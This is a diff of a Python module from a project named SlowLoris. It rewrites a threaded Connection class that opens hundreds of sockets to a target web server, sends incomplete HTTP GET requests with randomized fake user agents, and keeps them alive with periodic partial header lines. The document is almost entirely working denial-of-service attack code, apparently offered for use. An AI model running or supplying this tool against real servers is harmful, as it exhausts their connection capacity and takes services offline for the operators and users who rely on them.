@@ -25,61 +25,24 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 """
 
-import random
-import socket
-import threading
 import time
+import socket
+import random
+import threading
 
-from fake_useragent import UserAgent, FakeUserAgentError
 
+from Queue import Queue
 from SlowLoris import logger
-
-
-class SocketProducer(threading.Thread):
-    def __init__(self, queue):
-        super(SocketProducer, self).__init__()
-        self.queue = queue
-
-    def run(self):
-        while True:
-            if self.__alive_socket_cnt <= self.soc_cnt:  # add here tqdm
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(5)
-                    sock.connect((self.target['url'], self.target['port']))
-                    sock.send("GET /? {} HTTP/1.1\r\n".format(random.randint(0, 9999999)))
-                    for k in self.headers.keys():
-                        if k == "User-Agent":
-                            self.headers[k] = str(self.fake_ua.random)
-                        sock.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
-                    self.queue.put(sock)
-                except socket.error as err:
-                    logger.error(err)
-
-
-class RequestSender(threading.Thread):
-    def __init__(self, queue):
-        super(RequestSender, self).__init__()
-        self.queue = queue
-
-    def run(self):
-        while True:
-            soc = self.queue.get()
-            try:
-                soc.send("X-a: {} \r\n".format(random.randint(0, 9999999)))
-                self.__sended_request_cnt += 1
-            except socket.error:
-                self.__sockets.remove(soc)
-                self.__died_sockets_cnt += 1
-                self.__alive_socket_cnt -= 1
-            except Exception as e:
-                logger.exception(e)
-            finally:
-                self.queue.task_done()
+from fake_useragent import UserAgent, FakeUserAgentError
 
 
 class Connection(threading.Thread):
+    """
+        This class implement SlowLoris connection
+        This class extends Thread that's mean you must launch in like a thread.(Thank you, captain Obvious!)
+    """
     SLEEP_TIME = 0.01
+    COUNT_OF_PRODUCERS = 3
 
     def __init__(self, target, socket_count=300, headers={
         'User-Agent': None,  # UserAgent()
@@ -89,6 +52,12 @@ class Connection(threading.Thread):
         'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.7',
         'Connection': 'keep-alive'
     }):
+        """
+
+        :param target: link to web server [TargetInfo]
+        :param socket_count: maximum count of created socket default value 300
+        :param headers: HTTP headers what puts in request
+        """
         super(Connection, self).__init__()
         # self.lock = lock
         self.target = target
@@ -104,34 +73,106 @@ class Connection(threading.Thread):
         self.__cnt_died_sockets = 0
         self.__cnt_alive_socket = 0
         self.__sockets = []
+        self.is_stop = False
 
-    def __create_sockets(self):
-        while self.__cnt_alive_socket <= self.socket_count:  # add here tqdm
+    def isStopped(self):
+        return self.is_stop
+
+    def stop(self):
+        self.is_stop = True
+
+    def __del__(self):
+        for soc in self.__sockets:
             try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                sock.connect((self.target['url'], self.target['port']))
-                sock.send("GET /? {} HTTP/1.1\r\n".format(random.randint(0, 9999999)))
-                for k in self.headers.keys():
-                    if k == "User-Agent":
-                        self.headers[k] = str(self.fake_ua.random)
-                    sock.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
-                self.lock.acquire()
-                self.__sockets[0] += sock
-                self.lock.release()
-            except socket.error as err:
-                logger.error(err)
+                soc.close()
+            except socket.error:
+                continue
+            except Exception as ex:
+                logger.exception(ex)
+                # stop all daemons
+
+    def __create_sockets(self, lock):
+        """
+        :param lock: mutex for socket list
+        """
+        while not self.isStopped():
+            if self.__cnt_alive_socket < self.socket_count:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    sock.connect((unicode(self.target['ip']), self.target['port']))
+                    sock.send("GET /? {} HTTP/1.1\r\n".format(random.randint(0, 9999999)))
+                    for k in self.headers.keys():
+                        if k == "User-Agent":
+                            self.headers[k] = str(self.fake_ua.random)
+                        sock.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
+                    lock.acquire()
+                    self.__sockets.append(sock)
+                    self.__cnt_alive_socket += 1
+                    lock.release()
+                except socket.error as err:
+                    sock.close()
+                    logger.error(err)
+                except Exception as ex:
+                    logger.exception(ex)
 
     def get_counter(self):
-        return self.__cnt_sent_requests
+        return {"alive": self.__cnt_alive_socket, "died": self.__cnt_died_sockets,
+                "requests": self.__cnt_sent_requests}
+
+    def __send_requests(self, queue, lock):
+        """
+        :param queue: queue with sockets
+        :param lock: mutex for main counters
+        """
+        while not self.isStopped():
+            sock = queue.get()
+            try:
+                sock.send("X-a: {} \r\n".format(random.randint(0, 9999999)))
+                lock.acquire()
+                self.__cnt_sent_requests += 1
+                lock.release()
+                time.sleep(self.SLEEP_TIME * random.random())
+            except socket.error:
+                lock.acquire()
+                self.__cnt_alive_socket -= 1
+                self.__cnt_died_sockets += 1
+                lock.release()
+                self.__sockets.remove(sock)
+                sock.close()
+                # logger.error(err)
+            except Exception as ex:
+                logger.exception(ex)
+            finally:
+                queue.task_done()
 
     def run(self):
-        while self.is_alive:
-            try:
-                self.socket.send("X-a: {} \r\n".format(random.randint(0, 9999999)))
-                self.__cnt_sent_requests += 1
-                time.sleep(self.SLEEP_TIME * random.random())
-            except socket.error as err:
-                logger.error(err)
-            finally:
-                self.socket.close()
+        create_lock = threading.Lock()
+        counters_lock = threading.Lock()
+        # run creators
+        for _ in range(self.COUNT_OF_PRODUCERS):
+            t = threading.Thread(target=self.__create_sockets, args=(create_lock,))
+            t.daemon = True
+            t.start()
+
+        # waiting for sockets
+        while self.__cnt_alive_socket < self.socket_count:
+            time.sleep(1)
+
+        queue = Queue(self.socket_count + 10)  # +10 for fun
+
+        # run senders
+        for _ in range(self.COUNT_OF_PRODUCERS):
+            t = threading.Thread(target=self.__send_requests, args=(queue, counters_lock,))
+            t.daemon = True
+            t.start()
+
+        while not self.isStopped():
+            if self.__cnt_alive_socket < self.socket_count:
+                time.sleep(1)
+
+            random.shuffle(self.__sockets)
+
+            for sock in self.__sockets:
+                queue.put(sock)
+                queue.join()
